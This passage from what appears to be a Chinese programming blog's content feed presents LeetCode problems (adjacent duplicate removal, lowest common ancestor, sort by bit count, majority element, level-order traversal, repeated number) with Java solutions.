</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助栈</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">removeDuplicates</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">		Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : S.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">				stack.add(c);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (stack.peek() == c) &#123;</span><br><span class="line">				stack.pop();</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			stack.add(c);</span><br><span class="line">		&#125;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">while</span> (!stack.isEmpty() ) &#123;</span><br><span class="line">			sb.append(stack.pop());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>替换函数</p>
<ol>
<li>将 <code>aa</code> 到 <code>zz</code> 的 26 种重复项放入集合中；</li>
<li>遍历这 26 种重复项，并用字符串的替换函数把重复项替换成空串。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">removeDuplicates</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// generate 26 possible duplicates</span></span><br><span class="line">        HashSet&lt;String&gt; duplicates = <span class="keyword">new</span> HashSet();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="string">'a'</span>; i &lt;= <span class="string">'z'</span>; ++i) &#123;</span><br><span class="line">            sb.setLength(<span class="number">0</span>);</span><br><span class="line">            sb.append(i); sb.append(i);</span><br><span class="line">            duplicates.add(sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> prevLength = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (prevLength != S.length()) &#123;</span><br><span class="line">            prevLength = S.length();</span><br><span class="line">            <span class="keyword">for</span> (String d : duplicates) S = S.replace(d, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> S;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>235. 二叉搜索树的最近公共祖先</title>
    <url>/2020/04/17/LeetCode/leetcode-235-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png" alt></p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 8</span><br><span class="line">输出: 6 </span><br><span class="line">解释: 节点 2 和节点 8 的最近公共祖先是 6。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 4</span><br><span class="line">输出: 2</span><br><span class="line">解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>所有节点的值都是唯一的。</li>
<li>p、q 为不同节点且均存在于给定的二叉搜索树中。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (p.val &lt; root.val &amp;&amp; q.val &lt; root.val) &#123;</span><br><span class="line">			<span class="keyword">return</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p.val &gt; root.val &amp;&amp; q.val &gt; root.val) &#123;</span><br><span class="line">			<span class="keyword">return</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> root;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>1356. 根据数字二进制下 1 的数目排序</title>
    <url>/2020/04/17/LeetCode/leetcode-001356.%20%E6%A0%B9%E6%8D%AE%E6%95%B0%E5%AD%97%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%8B%201%20%E7%9A%84%E6%95%B0%E7%9B%AE%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数数组 arr 。请你将数组中的元素按照其二进制表示中数字 1 的数目升序排序。</p>
<p>如果存在多个数字二进制中 1 的数目相同，则必须将它们按照数值大小升序排列。</p>
<p>请你返回排序后的数组。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [0,1,2,3,4,5,6,7,8]</span><br><span class="line">输出：[0,1,2,4,8,3,5,6,7]</span><br><span class="line">解释：[0] 是唯一一个有 0 个 1 的数。</span><br><span class="line">[1,2,4,8] 都有 1 个 1 。</span><br><span class="line">[3,5,6] 有 2 个 1 。</span><br><span class="line">[7] 有 3 个 1 。</span><br><span class="line">按照 1 的个数排序得到的结果数组为 [0,1,2,4,8,3,5,6,7]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1024,512,256,128,64,32,16,8,4,2,1]</span><br><span class="line">输出：[1,2,4,8,16,32,64,128,256,512,1024]</span><br><span class="line">解释：数组中所有整数二进制下都只有 1 个 1 ，所以你需要按照数值大小将它们排序。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10000,10000]</span><br><span class="line">输出：[10000,10000]</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：arr = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>]</span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：arr = [<span class="number">10</span>,<span class="number">100</span>,<span class="number">1000</span>,<span class="number">10000</span>]</span><br><span class="line">输出：[<span class="number">10</span>,<span class="number">100</span>,<span class="number">10000</span>,<span class="number">1000</span>]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= arr.length &lt;= 500</code></li>
<li><code>0 &lt;= arr[i] &lt;= 10^4</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>自定义排序规则</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> oneNums;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Value</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.value = value;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			value = value &amp; (value - <span class="number">1</span>);</span><br><span class="line">			n++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.oneNums = n;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getOneNums</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> oneNums;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortByBits(<span class="keyword">int</span>[] arr) &#123;</span><br><span class="line">		List&lt;Value&gt; values = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> a : arr) &#123;</span><br><span class="line">			Value value = <span class="keyword">new</span> Value(a);</span><br><span class="line">			values.add(value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Collections.sort(values, <span class="keyword">new</span> Comparator&lt;Value&gt;() &#123;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Value o1, Value o2)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">if</span> (o1.getOneNums() - o2.getOneNums() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (o1.getOneNums() - o2.getOneNums() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> o1.getValue() - o2.getValue();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++) &#123;</span><br><span class="line">			result[i] = values.get(i).getValue();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题39. 数组中出现次数超过一半的数字</title>
    <url>/2020/04/17/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-39-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 2, 3, 2, 2, 2, 5, 4, 2]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= 数组长度 &lt;= 50000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == nums || <span class="number">0</span> == nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> length = nums.length / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(num)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (map.get(num) + <span class="number">1</span> &gt; length) &#123;</span><br><span class="line">                    <span class="keyword">return</span> num;</span><br><span class="line">                &#125;</span><br><span class="line">                map.replace(num, map.get(num) + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(num, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>如果数字出现的次数大于数组的一半的话，排序完之后，中间位置的肯定就是那个数字。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int majorityElement(int[] nums) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        return nums[nums.length &#x2F; 2];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题32 - II. 从上到下打印二叉树 II</title>
    <url>/2020/04/17/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-32%20-%20II.%20%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。</p>
<p>例如:<br> 给定二叉树: <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>

<p>返回其层次遍历结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="number">3</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>节点总数 &lt;= 1000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>迭代法</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Queue&lt;TreeNode&gt; nodes = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">		nodes.add(root);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (!nodes.isEmpty()) &#123;</span><br><span class="line">			List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = nodes.size(); i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">				TreeNode node = nodes.poll();</span><br><span class="line">				tmp.add(node.val);</span><br><span class="line">				<span class="keyword">if</span> (node.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">					nodes.add(node.left);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (node.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">					nodes.add(node.right);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			result.add(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题68 - I. 二叉搜索树的最近公共祖先</title>
    <url>/2020/04/17/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-68%20-%20I.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png" alt></p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 8</span><br><span class="line">输出: 6 </span><br><span class="line">解释: 节点 2 和节点 8 的最近公共祖先是 6。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 4</span><br><span class="line">输出: 2</span><br><span class="line">解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>所有节点的值都是唯一的。</li>
<li>p、q 为不同节点且均存在于给定的二叉搜索树中。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (p.val &lt; root.val &amp;&amp; q.val &lt; root.val) &#123;</span><br><span class="line">			<span class="keyword">return</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p.val &gt; root.val &amp;&amp; q.val &gt; root.val) &#123;</span><br><span class="line">			<span class="keyword">return</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> root;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题03. 数组中重复的数字</title>
    <url>/2020/04/17/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%9803.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>找出数组中重复的数字。</p>
<p>在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[2, 3, 1, 0, 2, 5, 3]</span><br><span class="line">输出：2 或 3</span><br></pre></td></tr></table></figure>

<h2 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h2><ul>
<li>2 &lt;= n &lt;= 100000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashSet</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set.contains(num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> num;</span><br><span class="line">            &#125;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>计数排序</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100001</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            count[num]++;</span><br><span class="line">            <span class="keyword">if</span> (count[num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>排序，判断相邻的元素是否相等</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题68 - II. 二叉树的最近公共祖先</title>
    <url>/2020/04/17/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-68%20-%20II.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/binarytree.png" alt></p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1</span><br><span class="line">输出: 3</span><br><span class="line">解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 4</span><br><span class="line">输出: 5</span><br><span class="line">解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

